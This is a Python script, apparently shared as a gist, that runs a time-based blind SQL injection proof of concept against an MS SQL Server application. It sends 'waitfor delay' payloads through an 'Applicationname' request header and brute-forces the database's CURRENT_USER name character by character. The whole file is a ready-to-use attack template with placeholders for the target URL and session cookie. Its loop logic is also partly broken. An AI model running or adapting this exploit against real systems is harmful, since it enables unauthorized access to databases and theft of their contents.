#date: 2024-04-08T16:52:29Z
#url: https://api.github.com/gists/f2e2d77639d977b7e5c0142a0bb42df6
#owner: https://api.github.com/users/Ryn0K

#!/usr/bin/env python3
from requests import *
from sys import exit
import string

s = Session()
# set variables 
url = ''
cookie = {'<cookiename>':'<value>'}
s.cookies.update(cookie)
temp_postdata = {}

def dumplength(l):
    '''function to find the length of CURRENT_USER'''
    payload = f"; if (LEN(CURRENT_USER) = {l}) waitfor delay '0:0:5' --" 
    try:
        r=s.post(url,headers={'Applicationname':payload},json=temp_postdata,allow_redirects=False)
        if r.status_code== 200:
            timetook = r.elapsed.total_seconds()
            if(timetook >= 5):
                return True
        else:
            print('status code != 200')  
    except Exception as e:
        print(e)
    return False

def dumpusername(i,c):
    '''function to dump length of CURRENT_USER'''
    payload = f"; if (SUBSTRING((SELECT CURRENT_USER),{i},1) = '{c}') waitfor delay '0:0:5' --" 
    try:
        r=s.post(url,headers={'Applicationname':payload},json=temp_postdata,allow_redirects=False)
        if r.status_code== 200:
            timetook = r.elapsed.total_seconds()
            if(timetook >= 5):
                return True
        else:
            print('status code != 200')  
    except Exception as e:
        print(e)
    return False
if __name__ == '__main__':
    print("[!] This script is only for POC purpose, Using Blind SQL injection attacker can dump whole database.")
    print("[*] Finding the length of current user of database")
    l = 0
    i = 0
    while True:
        try:
            if(dumplength(i)):
                l = i
                print(f'[+] Found length of CURRENT_USER : {l}')
            else:
                i+=1
        except KeyboardInterrupt as e:
            print('Exiting')
            break
    i = 1 
    result = ""
    character_to_bruteforce = " " + string.ascii_letters + string.digits
    if (l != 0):
        print("[*] dumping username")
        while (i<=l):
            try:
                for c in character_to_bruteforce:
                    if(dumpusername(i,c)):
                        result+=c
                        i+=1
                        print(result)
                        continue
            except KeyboardInterrupt as e:
                break
    else:
        exit(0)
        
